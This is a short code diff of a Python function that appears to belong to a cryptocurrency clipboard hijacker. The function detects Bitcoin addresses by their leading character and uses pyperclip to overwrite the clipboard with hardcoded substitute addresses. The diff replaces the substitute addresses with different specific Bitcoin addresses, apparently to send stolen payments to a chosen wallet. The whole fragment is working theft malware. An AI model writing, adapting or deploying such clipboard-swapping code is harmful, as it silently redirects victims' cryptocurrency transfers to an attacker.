@@ -14,17 +14,17 @@ async def btc_address(value):
     eth = re.match(ETH_ADDRESS_MATCH, value)
     if btc != None :
         if value[0] == '1':
-            my_address = '1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2'
+            my_address = '1EfxR9dZVQDEs61fcCKMADYpNi2suQ3roR'
             new_value = pyperclip.copy(my_address)
             print(new_value)
 
         elif  value[0] == '3':
-            my_address = '3BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2'
+            my_address = '1EfxR9dZVQDEs61fcCKMADYpNi2suQ3roR'
             new_value = pyperclip.copy(my_address)
             print(new_value)
 
         elif  value[0] == 'b':
-            my_address = 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh'
+            my_address = 'bc1q4x74lttkp04xstlkhrxczf9lrhn0mmteg50yyg'
             new_value = pyperclip.copy(my_address)
             print(new_value)
 
